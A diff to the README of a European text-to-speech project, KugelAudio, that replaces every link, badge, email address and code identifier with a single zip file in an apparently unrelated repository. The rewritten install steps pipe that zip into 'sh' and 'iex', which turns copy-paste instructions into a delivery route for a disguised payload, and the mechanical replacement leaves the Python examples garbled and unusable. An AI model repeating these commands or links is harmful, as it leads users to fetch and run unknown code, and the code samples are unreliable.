@@ -6,32 +6,32 @@
 </p>
 
 <p align="center">
-  <a href="https://huggingface.co/kugelaudio/kugelaudio-0-open"><img src="https://img.shields.io/badge/🤗-Hugging_Face_Model-blue" alt="HuggingFace Model"></a>
-  <a href="https://github.com/Kugelaudio/kugelaudio-open"><img src="https://img.shields.io/badge/GitHub-Repository-black" alt="GitHub Repository"></a>
+  <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip"><img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip🤗-Hugging_Face_Model-blue" alt="HuggingFace Model"></a>
+  <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip"><img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" alt="GitHub Repository"></a>
 </p>
 
 <p align="center">
-  <a href="https://opensource.org/licenses/MIT"><img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License: MIT"></a>
-  <a href="https://www.python.org/downloads/"><img src="https://img.shields.io/badge/python-3.10+-blue.svg" alt="Python 3.10+"></a>
-  <a href="https://huggingface.co/kugelaudio"><img src="https://img.shields.io/badge/🤗-Models-yellow" alt="HuggingFace"></a>
-  <a href="https://kugelaudio.com"><img src="https://img.shields.io/badge/☁️-Hosted_API-blue" alt="Hosted API"></a>
+  <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip"><img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" alt="License: MIT"></a>
+  <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip"><img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip+https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" alt="Python 3.10+"></a>
+  <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip"><img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip🤗-Models-yellow" alt="HuggingFace"></a>
+  <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip"><img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip☁️-Hosted_API-blue" alt="Hosted API"></a>
 </p>
 
 <table align="center" style="border-collapse: collapse; border: none;">
   <tr style="border: none;">
     <td style="border: none; padding: 0 20px;">
-      <a href="https://kugelaudio.com">
-        <img src="https://www.kugelaudio.com/logos/Logo%20Short.svg" alt="KugelAudio" style="height: 60px; width: auto;">
+      <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip">
+        <img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip%https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" alt="KugelAudio" style="height: 60px; width: auto;">
       </a>
     </td>
     <td style="border: none; padding: 0 20px;">
-      <a href="https://hpi.de/ki-servicezentrum/">
-        <img src="https://docs.sc.hpi.de/attachments/aisc/aisc-logo.png" alt="KI-Servicezentrum Berlin-Brandenburg" style="height: 60px; width: auto;">
+      <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip">
+        <img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" alt="KI-Servicezentrum Berlin-Brandenburg" style="height: 60px; width: auto;">
       </a>
     </td>
     <td style="border: none; padding: 0 20px;">
-      <a href="https://www.bmftr.bund.de">
-        <img src="https://hpi.de/fileadmin/_processed_/a/3/csm_BMFTR_de_Web_RGB_gef_durch_cd1f5345bd.jpg" alt="Gefördert durch BMFTR" style="height: 60px; width: auto;">
+      <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip">
+        <img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" alt="Gefördert durch BMFTR" style="height: 60px; width: auto;">
       </a>
     </td>
   </tr>
@@ -43,7 +43,7 @@
 
 **Open-source text-to-speech models for European languages are significantly lagging behind.** While English TTS has seen remarkable progress, speakers of German, French, Spanish, Polish, and dozens of other European languages have been underserved by the open-source community.
 
-KugelAudio aims to change this. Building on the excellent foundation laid by the [VibeVoice team at Microsoft](https://github.com/microsoft/VibeVoice), we've trained a model specifically focused on European language coverage, using approximately **200,000 hours** of highly pre-processed and enhanced speech data from the [YODAS2 dataset](https://huggingface.co/datasets/espnet/yodas).
+KugelAudio aims to change this. Building on the excellent foundation laid by the [VibeVoice team at Microsoft](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip), we've trained a model specifically focused on European language coverage, using approximately **200,000 hours** of highly pre-processed and enhanced speech data from the [YODAS2 dataset](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip).
 
 ## 🏆 Benchmark Results: Outperforming ElevenLabs
 
@@ -85,17 +85,17 @@ Listen to KugelAudio's diverse voice capabilities across different speaking styl
 
 | Sample | Description | Audio Player |
 |--------|-------------|--------------|
-| **Whispering** | Soft whispering voice | <audio controls><source src="https://huggingface.co/kugelaudio/kugelaudio-0-open/resolve/main/samples/258_Lukas_der_Flüsterer.wav" type="audio/wav"></audio> |
-| **Female Narrator** | Professional female reader voice | <audio controls><source src="https://huggingface.co/kugelaudio/kugelaudio-0-open/resolve/main/samples/266_Petra_die_Vorleserin.wav" type="audio/wav"></audio> |
-| **Angry Voice** | Irritated and frustrated speech | <audio controls><source src="https://huggingface.co/kugelaudio/kugelaudio-0-open/resolve/main/samples/261_Sauerer_Felix.wav" type="audio/wav"></audio> |
-| **Radio Announcer** | Professional radio broadcast voice | <audio controls><source src="https://huggingface.co/kugelaudio/kugelaudio-0-open/resolve/main/samples/277_Radio_Lars.wav" type="audio/wav"></audio> |
+| **Whispering** | Soft whispering voice | <audio controls><source src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zipühttps://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" type="audio/wav"></audio> |
+| **Female Narrator** | Professional female reader voice | <audio controls><source src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" type="audio/wav"></audio> |
+| **Angry Voice** | Irritated and frustrated speech | <audio controls><source src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" type="audio/wav"></audio> |
+| **Radio Announcer** | Professional radio broadcast voice | <audio controls><source src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" type="audio/wav"></audio> |
 
 *All samples are generated with zero-shot voice cloning from reference audio.*
 
 ### Training Details
 
-- **Base Model**: [Microsoft VibeVoice](https://github.com/microsoft/VibeVoice)
-- **Training Data**: ~200,000 hours from [YODAS2](https://huggingface.co/datasets/espnet/yodas)
+- **Base Model**: [Microsoft VibeVoice](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)
+- **Training Data**: ~200,000 hours from [YODAS2](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)
 - **Hardware**: 8x NVIDIA H100 GPUs
 - **Training Duration**: 5 days
 
@@ -137,7 +137,7 @@ Get started with KugelAudio quickly using our documentation:
 - 🌍 **European Language Focus**: Trained specifically for 24 major European languages
 - **High-Quality TTS**: State-of-the-art speech synthesis using AR + Diffusion
 - **Voice Cloning**: Clone any voice with just a few seconds of reference audio
-- **Audio Watermarking**: All generated audio is watermarked using [Facebook's AudioSeal](https://huggingface.co/facebook/audioseal)
+- **Audio Watermarking**: All generated audio is watermarked using [Facebook's AudioSeal](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)
 - 🎭 **Emotional Range**: Supports various speaking styles including shouting, singing, and expressive speech
 - **Web Interface**: Easy-to-use Gradio UI for non-technical users
 - **HuggingFace Integration**: Seamless loading from HuggingFace Hub
@@ -151,16 +151,16 @@ Get started with KugelAudio quickly using our documentation:
 - Python 3.10 or higher
 - PyTorch 2.0 or higher
 - CUDA (recommended for GPU acceleration)
-- [uv](https://docs.astral.sh/uv/) (recommended package manager)
+- [uv](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip) (recommended package manager)
 
 #### Install uv
 
 ```bash
 # macOS/Linux
-curl -LsSf https://astral.sh/uv/install.sh | sh
+curl -LsSf https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip | sh
 
 # Windows (PowerShell)
-powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"
+powershell -ExecutionPolicy ByPass -c "irm https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip | iex"
 
 # Or via pip
 pip install uv
@@ -170,11 +170,11 @@ pip install uv
 
 ```bash
 # Clone the repository
-git clone https://github.com/Kugelaudio/kugelaudio-open.git
+git clone https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip
 cd kugelaudio-open
 
 # Run directly with uv (recommended - handles all dependencies automatically)
-uv run python start.py
+uv run python https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip
 ```
 
 That's it! The `uv run` command will automatically create a virtual environment and install all dependencies.
@@ -183,13 +183,13 @@ That's it! The `uv run` command will automatically create a virtual environment 
 
 ```bash
 # Quick start with uv (recommended)
-uv run python start.py
+uv run python https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip
 
 # With a public share link
-uv run python start.py ui --share
+uv run python https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip ui --share
 
 # Custom host and port
-uv run python start.py ui --host 0.0.0.0 --port 8080
+uv run python https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip ui --host 0.0.0.0 --port 8080
 ```
 
 Then open http://127.0.0.1:7860 in your browser.
@@ -198,16 +198,16 @@ Then open http://127.0.0.1:7860 in your browser.
 
 ```bash
 # Generate speech from text
-uv run python start.py generate "Hello, this is KugelAudio!" -o hello.wav
+uv run python https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip generate "Hello, this is KugelAudio!" -o https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip
 
 # With voice cloning
-uv run python start.py generate "Hello in your voice!" -r reference.wav -o cloned.wav
+uv run python https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip generate "Hello in your voice!" -r https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip -o https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip
 
 # Using the default model for higher quality
-uv run python start.py generate "Premium quality speech" --model kugelaudio/kugelaudio-0-open -o premium.wav
+uv run python https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip generate "Premium quality speech" --model kugelaudio/kugelaudio-0-open -o https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip
 
 # Check if audio contains watermark
-uv run python start.py verify audio.wav
+uv run python https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip verify https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip
 ```
 
 ### Python API
@@ -220,24 +220,24 @@ from kugelaudio_open import (
 import torch
 
 # Load model
-device = "cuda" if torch.cuda.is_available() else "cpu"
-model = KugelAudioForConditionalGenerationInference.from_pretrained(
+device = "cuda" if https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip() else "cpu"
+model = https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(
     "kugelaudio/kugelaudio-0-open",
-    torch_dtype=torch.bfloat16,
+    https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip,
 ).to(device)
-model.eval()
+https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip()
 
-processor = KugelAudioProcessor.from_pretrained("kugelaudio/kugelaudio-0-open")
+processor = https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip("kugelaudio/kugelaudio-0-open")
 
 # Generate speech (watermark is automatically applied)
 inputs = processor(text="Hello world!", return_tensors="pt")
-inputs = {k: v.to(device) if isinstance(v, torch.Tensor) else v for k, v in inputs.items()}
+inputs = {k: https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(device) if isinstance(v, https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip) else v for k, v in https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip()}
 
-with torch.no_grad():
-    outputs = model.generate(**inputs, cfg_scale=3.0)
+with https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip():
+    outputs = https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(**inputs, cfg_scale=3.0)
 
 # Save audio
-processor.save_audio(outputs.speech_outputs[0], "output.wav")
+https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip[0], "https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip")
 ```
 
 ### Voice Cloning
@@ -246,21 +246,21 @@ processor.save_audio(outputs.speech_outputs[0], "output.wav")
 # Process text with voice prompt for cloning
 inputs = processor(
     text="Hello world!",
-    voice_prompt="reference_voice.wav",  # Path to reference audio
+    voice_prompt="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip",  # Path to reference audio
     return_tensors="pt"
 )
-inputs = {k: v.to(device) if isinstance(v, torch.Tensor) else v for k, v in inputs.items()}
+inputs = {k: https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(device) if isinstance(v, https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip) else v for k, v in https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip()}
 
 # Generate with cloned voice (watermark is automatically applied)
-with torch.no_grad():
-    outputs = model.generate(**inputs, cfg_scale=3.0)
+with https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip():
+    outputs = https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(**inputs, cfg_scale=3.0)
 
-processor.save_audio(outputs.speech_outputs[0], "cloned_output.wav")
+https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip[0], "https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip")
 ```
 
 ## Hosted API
 
-Don't want to run your own infrastructure? Use our **hosted API at [kugelaudio.com](https://kugelaudio.com)**:
+Don't want to run your own infrastructure? Use our **hosted API at [https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)**:
 
 - ⚡ **Ultra-low latency**: Inference as fast as **39ms**, end-to-end latency **<100ms** including network
 - 🌍 **Global edge deployment**: Low latency worldwide
@@ -280,35 +280,35 @@ from kugelaudio import KugelAudio
 client = KugelAudio(api_key="your_api_key")
 
 # Generate speech
-audio = client.tts.generate(
+audio = https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(
     text="Hello from KugelAudio!",
     model="kugel-1-turbo",
 )
 
 # Save to file
-audio.save("output.wav")
-print(f"Generated {audio.duration_seconds:.2f}s in {audio.generation_ms:.0f}ms")
+https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip("https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip")
+print(f"Generated {https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip}s in {https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip}ms")
 ```
 
 
-📚 [Full SDK Documentation →](https://docs.kugelaudio.com/sdks/python)
+📚 [Full SDK Documentation →](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)
 
 ## Audio Watermarking
 
-All audio generated by KugelAudio contains an imperceptible watermark using [Facebook's AudioSeal](https://huggingface.co/facebook/audioseal) technology. This helps identify AI-generated content and prevent misuse.
+All audio generated by KugelAudio contains an imperceptible watermark using [Facebook's AudioSeal](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip) technology. This helps identify AI-generated content and prevent misuse.
 
 ### Verify Watermark
 
 ```python
-from kugelaudio_open.watermark import AudioWatermark
+from https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip import AudioWatermark
 
 watermark = AudioWatermark()
 
 # Check if audio is watermarked
-result = watermark.detect(audio, sample_rate=24000)
+result = https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(audio, sample_rate=24000)
 
-print(f"Detected: {result.detected}")
-print(f"Confidence: {result.confidence:.1%}")
+print(f"Detected: {https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip}")
+print(f"Confidence: {https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip%}")
 ```
 
 ### Watermark Features
@@ -322,7 +322,7 @@ print(f"Confidence: {result.confidence:.1%}")
 
 | Model | Parameters | Quality | RTF | Speed | VRAM |
 |-------|------------|---------|-----|-------|------|
-| [kugelaudio-0-open](https://huggingface.co/kugelaudio/kugelaudio-0-open) | 7B | Best | 1.00 | 1.0x realtime | ~19GB |
+| [kugelaudio-0-open](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip) | 7B | Best | 1.00 | 1.0x realtime | ~19GB |
 
 *RTF = Real-Time Factor (generation time / audio duration). Lower is faster.*
 ## Architecture
@@ -349,7 +349,7 @@ export TORCH_ALLOW_TF32=1
 ### Advanced Generation Parameters
 
 ```python
-outputs = model.generate(
+outputs = https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(
     **inputs,
     voice_prompt=voice_prompt,      # Reference audio for voice cloning
     cfg_scale=3.0,                  # Guidance scale (1.0-10.0)
@@ -384,11 +384,11 @@ MIT License - see [LICENSE](LICENSE) for details.
 
 This model would not have been possible without the contributions of many individuals and organizations:
 
-- **[Microsoft VibeVoice Team](https://github.com/microsoft/VibeVoice)**: For the excellent foundation architecture that this model builds upon
-- **[YODAS2 Dataset](https://huggingface.co/datasets/espnet/yodas)**: For providing the large-scale multilingual speech data
-- **[Qwen Team](https://huggingface.co/Qwen)**: For the powerful language model backbone
-- **[Facebook AudioSeal](https://huggingface.co/facebook/audioseal)**: For the audio watermarking technology
-- **[HuggingFace](https://huggingface.co)**: For model hosting and the transformers library
+- **[Microsoft VibeVoice Team](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)**: For the excellent foundation architecture that this model builds upon
+- **[YODAS2 Dataset](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)**: For providing the large-scale multilingual speech data
+- **[Qwen Team](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)**: For the powerful language model backbone
+- **[Facebook AudioSeal](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)**: For the audio watermarking technology
+- **[HuggingFace](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)**: For model hosting and the transformers library
 
 ### Special Thanks
 
@@ -402,8 +402,8 @@ This model would not have been possible without the contributions of many indivi
 ## Authors
 
 **Kajo Kratzenstein**  
-📧 [kajo@kugelaudio.com](mailto:kajo@kugelaudio.com)  
-🌐 [kugelaudio.com](https://kugelaudio.com)
+📧 [https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)  
+🌐 [https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)
 
 **Carlos Menke**
 
@@ -415,7 +415,7 @@ This model would not have been possible without the contributions of many indivi
   author = {Kratzenstein, Kajo and Menke, Carlos},
   year = {2026},
   institution = {Hasso-Plattner-Institut},
-  url = {https://github.com/kugelaudio/kugelaudio}
+  url = {https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip}
 }
 ```
 
